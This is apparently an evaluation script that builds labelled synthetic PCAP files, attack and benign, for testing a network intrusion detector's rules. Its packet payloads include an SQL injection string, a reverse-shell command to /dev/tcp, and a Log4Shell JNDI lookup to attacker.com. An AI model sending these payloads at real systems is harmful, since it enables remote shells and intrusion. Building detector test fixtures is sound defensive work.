"""
evaluation/generate_test_pcap.py
---------------------------------
Generates labelled synthetic test fixtures for all six current detection rules.

Each scenario is documented with:
  - scenario_id
  - which rule(s) should fire
  - what benign cases should NOT fire
  - the PCAP file path written

IMPORTANT: Uses an isolated TEST blocklist fixture (data/test_blocklist.txt)
and does NOT write to the production blocklist (data/blocklist.txt).
See §3.11 of the improvement roadmap.

Usage:
  python evaluation/generate_test_pcap.py

Outputs:
  data/test_attacks.pcap          -- all attack scenarios
  data/test_benign.pcap           -- benign negative cases
  data/test_blocklist.txt         -- isolated test-only blocklist fixture
  evaluation/scenarios/test_labels.csv  -- labelled scenario manifest

All packets carry explicit pkt.time values so that replay is deterministic
(§3.1 — timestamps preserved through _extract()).
"""

import os
import sys
import csv
import time

from scapy.all import Ether, IP, TCP, UDP, ARP, DNS, DNSQR, Raw, wrpcap

# ---------------------------------------------------------------------------
# Paths — all isolated from production data
# ---------------------------------------------------------------------------
OUTPUT_ATTACK = "data/test_attacks.pcap"
OUTPUT_BENIGN = "data/test_benign.pcap"
TEST_BLOCKLIST = "data/test_blocklist.txt"  # isolated — not the production blocklist
LABELS_CSV = "evaluation/scenarios/test_labels.csv"

# Test-only malicious IP — documentation range (RFC 5737), never in production feeds
TEST_MALICIOUS_IP = "198.51.100.42"

# Base time: a fixed past timestamp so replays are always deterministic
BASE_TIME = 1_700_000_000.0  # 2023-11-14 22:13:20 UTC


# ---------------------------------------------------------------------------
# Scenario manifest (source of truth for the labels CSV)
# ---------------------------------------------------------------------------
SCENARIOS: list[dict] = []


def scenario(sid: str, rule: str, description: str):
    """Register a scenario in the manifest."""
    SCENARIOS.append({
        "scenario_id": sid,
        "expected_rule": rule,
        "description": description,
    })


# ---------------------------------------------------------------------------
# Attack scenario packet generators
# ---------------------------------------------------------------------------

def _make_eth(src_mac="aa:bb:cc:11:22:33", dst_mac="00:11:22:33:44:55"):
    return Ether(src=src_mac, dst=dst_mac)


def gen_blocklist_hit(base: float) -> list:
    """S01: A host contacts a known-malicious IP → should fire BLOCKLIST."""
    scenario("S01", "BLOCKLIST", "Host contacts known-malicious IP")
    pkt = (_make_eth("aa:bb:cc:55:55:55") /
           IP(src="192.168.1.55", dst=TEST_MALICIOUS_IP) /
           TCP(sport=43210, dport=443, flags="S"))
    pkt.time = base + 1.0
    return [pkt]


def gen_vertical_port_scan(base: float) -> list:
    """S02: One src probes 20 distinct ports on one host → VERTICAL PORT_SCAN."""
    scenario("S02", "PORT_SCAN", "Vertical port scan: one src, many ports, one target")
    pkts = []
    for i, port in enumerate(range(20, 40)):
        pkt = (_make_eth("de:ad:be:ef:01:05") /
               IP(src="192.168.1.105", dst="192.168.1.1") /
               TCP(sport=55000 + port, dport=port, flags="S"))
        pkt.time = base + 10.0 + (i * 0.05)
        pkts.append(pkt)
    return pkts


def gen_horizontal_port_scan(base: float) -> list:
    """S03: One src probes port 22 across 20 different hosts → HORIZONTAL PORT_SCAN."""
    scenario("S03", "PORT_SCAN", "Horizontal port scan: one src, one port, many hosts")
    pkts = []
    for i in range(20):
        pkt = (_make_eth("de:ad:be:ef:01:06") /
               IP(src="10.0.0.50", dst=f"10.0.1.{i + 1}") /
               TCP(sport=60000, dport=22, flags="S"))
        pkt.time = base + 20.0 + (i * 0.05)
        pkts.append(pkt)
    return pkts


def gen_syn_flood(base: float) -> list:
    """S04: 120 SYN packets to port 80 in rapid succession → SYN_FLOOD."""
    scenario("S04", "SYN_FLOOD", "SYN burst: 120 SYNs to port 80 in <10s")
    pkts = []
    for seq in range(120):
        pkt = (_make_eth("de:ad:be:ef:02:00") /
               IP(src="192.168.1.200", dst="192.168.1.1") /
               TCP(sport=10000 + seq, dport=80, flags="S"))
        pkt.time = base + 30.0 + (seq * 0.05)
        pkts.append(pkt)
    return pkts


def gen_arp_spoof(base: float) -> list:
    """S05: First legitimate ARP mapping, then forged claim → ARP_SPOOF."""
    scenario("S05", "ARP_SPOOF", "ARP identity change: gateway MAC changes")
    # Normal gateway ARP announcement
    normal_arp = (_make_eth("00:11:22:33:44:01", "ff:ff:ff:ff:ff:ff") /
                  ARP(op="is-at", psrc="192.168.1.1",
                      hwsrc="00:11:22:33:44:01", pdst="192.168.1.50"))
    normal_arp.time = base + 50.0

    # Rogue ARP response claiming 192.168.1.1 has a different MAC
    spoofed_arp = (_make_eth("de:ad:be:ef:99:99", "ff:ff:ff:ff:ff:ff") /
                   ARP(op="is-at", psrc="192.168.1.1",
                       hwsrc="de:ad:be:ef:99:99", pdst="192.168.1.50"))
    spoofed_arp.time = base + 51.0
    return [normal_arp, spoofed_arp]


def gen_sql_injection(base: float) -> list:
    """S06: HTTP payload containing SQLi pattern → PAYLOAD_HIT / SQL_INJECTION."""
    scenario("S06", "PAYLOAD_HIT", "SQLi pattern in HTTP request body")
    payload = b"POST /login HTTP/1.1\r\nHost: target\r\n\r\nuser=admin' OR 1=1--"
    pkt = (_make_eth() /
           IP(src="192.168.1.77", dst="192.168.1.1") /
           TCP(sport=54321, dport=80, flags="PA") /
           Raw(load=payload))
    pkt.time = base + 60.0
    return [pkt]


def gen_cmd_injection(base: float) -> list:
    """S07: HTTP payload containing reverse-shell pattern → PAYLOAD_HIT / CMD_INJECTION."""
    scenario("S07", "PAYLOAD_HIT", "CMD_INJECTION / reverse shell in HTTP payload")
    payload = b"GET /?cmd=bash+-i+>%26+/dev/tcp/10.0.0.99/4444+0>%261 HTTP/1.1\r\n"
    pkt = (_make_eth() /
           IP(src="192.168.1.78", dst="192.168.1.1") /
           TCP(sport=54322, dport=80, flags="PA") /
           Raw(load=payload))
    pkt.time = base + 61.0
    return [pkt]


def gen_log4shell(base: float) -> list:
    """S08: HTTP payload containing Log4Shell JNDI pattern → PAYLOAD_HIT / LOG4SHELL."""
    scenario("S08", "PAYLOAD_HIT", "Log4Shell JNDI injection in User-Agent")
    payload = (b"GET / HTTP/1.1\r\n"
               b"User-Agent: ${jndi:ldap://attacker.com/exploit}\r\n\r\n")
    pkt = (_make_eth() /
           IP(src="192.168.1.79", dst="192.168.1.1") /
           TCP(sport=54323, dport=8080, flags="PA") /
           Raw(load=payload))
    pkt.time = base + 62.0
    return [pkt]


def gen_credential_leak(base: float) -> list:
    """S09: HTTP payload leaking plaintext password → PAYLOAD_HIT / CREDENTIAL_LEAK."""
    scenario("S09", "PAYLOAD_HIT", "Plaintext password= in HTTP POST body")
    payload = b"POST /auth HTTP/1.1\r\n\r\nusername=alice&password=s3cr3t123"
    pkt = (_make_eth() /
           IP(src="192.168.1.80", dst="192.168.1.1") /
           TCP(sport=54324, dport=80, flags="PA") /
           Raw(load=payload))
    pkt.time = base + 63.0
    return [pkt]


def gen_dns_dga(base: float) -> list:
    """S10: High-entropy DNS query (DGA-like) → DNS_ANOMALY."""
    scenario("S10", "DNS_ANOMALY", "High-entropy DGA-like DNS query")
    # 'xvqrztmplwbsnfhk' — all consonants, high entropy, len >= 8
    dga_label = "xvqrztmplwbsnfhk"
    pkt = (_make_eth() /
           IP(src="192.168.1.88", dst="8.8.8.8") /
           UDP(sport=54321, dport=53) /
           DNS(rd=1, qd=DNSQR(qname=f"{dga_label}.badactor.ru")))
    pkt.time = base + 70.0
    return [pkt]


def gen_dns_long(base: float) -> list:
    """S11: Very long DNS query (tunnelling-like) → DNS_ANOMALY."""
    scenario("S11", "DNS_ANOMALY", "Unusually long DNS query (>60 chars)")
    # 64-char label — common in DNS tunnelling (e.g. iodine, dnscat2)
    long_label = "a" * 63
    pkt = (_make_eth() /
           IP(src="192.168.1.89", dst="8.8.8.8") /
           UDP(sport=54322, dport=53) /
           DNS(rd=1, qd=DNSQR(qname=f"{long_label}.tunnel.example.com")))
    pkt.time = base + 71.0
    return [pkt]


# ---------------------------------------------------------------------------
# Benign negative packet generators  (should NOT fire any rule)
# ---------------------------------------------------------------------------

def gen_benign_http(base: float) -> list:
    """B01: Normal HTTP GET — should NOT fire PayloadRule."""
    pkts = []
    payload = b"GET /index.html HTTP/1.1\r\nHost: example.com\r\nAccept: */*\r\n\r\n"
    for i in range(3):
        pkt = (_make_eth() /
               IP(src="192.168.1.10", dst="93.184.216.34") /
               TCP(sport=50000 + i, dport=80, flags="PA") /
               Raw(load=payload))
        pkt.time = base + i * 0.1
        pkts.append(pkt)
    return pkts


def gen_benign_dns(base: float) -> list:
    """B02: Normal short, low-entropy DNS queries — should NOT fire DnsRule."""
    pkts = []
    for i, name in enumerate(["google.com", "example.com", "github.com"]):
        pkt = (_make_eth() /
               IP(src="192.168.1.10", dst="8.8.8.8") /
               UDP(sport=50000 + i, dport=53) /
               DNS(rd=1, qd=DNSQR(qname=name)))
        pkt.time = base + 0.5 + i * 0.1
        pkts.append(pkt)
    return pkts


def gen_benign_dns_server_reply(base: float) -> list:
    """B03: DNS server replying to many clients — should NOT fire PortScanRule.

    A naive port-scan rule would see many different 'destination ports'
    in the reply direction and falsely flag the DNS server.
    PortScanRule's WELL_KNOWN_SERVICE_PORTS filter (src_port=53) prevents this.
    """
    pkts = []
    for i in range(20):
        pkt = (_make_eth("00:11:22:33:44:01") /
               IP(src="8.8.8.8", dst=f"192.168.1.{i + 10}") /
               UDP(sport=53, dport=40000 + i))
        pkt.time = base + 1.0 + i * 0.1
        pkts.append(pkt)
    return pkts


def gen_benign_cdn_dns(base: float) -> list:
    """B04: Legitimate high-entropy CDN domain — should NOT fire DnsRule."""
    pkts = []
    for i, name in enumerate([
        "a0.akamai.net",
        "r3.o.lencr.org",
        "xvqrztmp.cloudflare.com",   # high entropy but whitelisted suffix
    ]):
        pkt = (_make_eth() /
               IP(src="192.168.1.10", dst="8.8.8.8") /
               UDP(sport=50010 + i, dport=53) /
               DNS(rd=1, qd=DNSQR(qname=name)))
        pkt.time = base + 2.0 + i * 0.1
        pkts.append(pkt)
    return pkts


def gen_benign_normal_arp(base: float) -> list:
    """B05: Stable ARP — same IP/MAC seen twice — should NOT fire ArpSpoofRule."""
    pkts = []
    for i in range(2):
        pkt = (_make_eth("00:aa:bb:cc:dd:ee", "ff:ff:ff:ff:ff:ff") /
               ARP(op="is-at", psrc="192.168.1.1",
                   hwsrc="00:aa:bb:cc:dd:ee", pdst="192.168.1.50"))
        pkt.time = base + 3.0 + i * 5.0
        pkts.append(pkt)
    return pkts


def gen_benign_syn_below_threshold(base: float) -> list:
    """B06: SYN packets well below flood threshold — should NOT fire SynFloodRule."""
    pkts = []
    for i in range(10):
        pkt = (_make_eth() /
               IP(src="192.168.1.20", dst="192.168.1.1") /
               TCP(sport=50100 + i, dport=80, flags="S"))
        pkt.time = base + 4.0 + i * 0.5  # spaced out, well under threshold
        pkts.append(pkt)
    return pkts


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def generate_all():
    base = BASE_TIME

    print("[*] Generating ATTACK scenarios ...")
    attack_pkts = []
    attack_pkts += gen_blocklist_hit(base)
    attack_pkts += gen_vertical_port_scan(base)
    attack_pkts += gen_horizontal_port_scan(base)
    attack_pkts += gen_syn_flood(base)
    attack_pkts += gen_arp_spoof(base)
    attack_pkts += gen_sql_injection(base)
    attack_pkts += gen_cmd_injection(base)
    attack_pkts += gen_log4shell(base)
    attack_pkts += gen_credential_leak(base)
    attack_pkts += gen_dns_dga(base)
    attack_pkts += gen_dns_long(base)

    os.makedirs("data", exist_ok=True)
    wrpcap(OUTPUT_ATTACK, attack_pkts)
    print(f"  [✔] {len(attack_pkts)} attack packets → {OUTPUT_ATTACK}")

    print("[*] Generating BENIGN negative scenarios ...")
    benign_pkts = []
    benign_pkts += gen_benign_http(base)
    benign_pkts += gen_benign_dns(base)
    benign_pkts += gen_benign_dns_server_reply(base)
    benign_pkts += gen_benign_cdn_dns(base)
    benign_pkts += gen_benign_normal_arp(base)
    benign_pkts += gen_benign_syn_below_threshold(base)

    wrpcap(OUTPUT_BENIGN, benign_pkts)
    print(f"  [✔] {len(benign_pkts)} benign packets → {OUTPUT_BENIGN}")

    # Write the isolated test blocklist (NOT the production blocklist)
    with open(TEST_BLOCKLIST, "w") as f:
        f.write(f"# Test-only blocklist — do not use in production\n")
        f.write(f"{TEST_MALICIOUS_IP}\n")
    print(f"  [✔] Test blocklist → {TEST_BLOCKLIST}")

    # Write labelled scenario CSV
    os.makedirs(os.path.dirname(LABELS_CSV), exist_ok=True)
    with open(LABELS_CSV, "w", newline="") as f:
        writer = csv.DictWriter(
            f,
            fieldnames=["scenario_id", "expected_rule", "description"],
        )
        writer.writeheader()
        writer.writerows(SCENARIOS)
    print(f"  [✔] Scenario labels ({len(SCENARIOS)} scenarios) → {LABELS_CSV}")

    print("\n[*] Summary:")
    print(f"    Attack PCAP:   {OUTPUT_ATTACK}")
    print(f"    Benign PCAP:   {OUTPUT_BENIGN}")
    print(f"    Test blocklist:{TEST_BLOCKLIST}")
    print(f"    Labels CSV:    {LABELS_CSV}")
    print()
    print("[*] To replay through the engine:")
    print(f"    python evaluation/replay.py {OUTPUT_ATTACK} --blocklist {TEST_BLOCKLIST}")
    print()
    print("[*] To evaluate against ground-truth labels:")
    print(f"    python evaluation/compare.py --mode ground-truth --labels {LABELS_CSV}")


if __name__ == "__main__":
    generate_all()
